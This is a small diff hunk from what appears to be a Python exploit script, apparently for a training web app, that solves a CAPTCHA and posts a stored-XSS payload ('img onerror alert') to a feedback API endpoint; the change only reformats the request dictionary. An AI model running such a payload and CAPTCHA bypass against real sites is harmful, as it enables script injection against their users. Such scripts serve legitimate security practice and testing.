@@ -21,12 +21,7 @@ print(f"[+] CAPTCHA: {question} = {answer}")
 feedback_url = f"{target}/api/Feedbacks/"
 payload = "<img src='x' onerror='alert(\"XSS\")'>"
 
-data = {
-    "comment": payload,
-    "rating": 5,
-    "captchaId": captcha_id,
-    "captcha": str(answer)
-}
+data = {"comment": payload, "rating": 5, "captchaId": captcha_id, "captcha": str(answer)}
 
 headers = {"Content-Type": "application/json"}
 
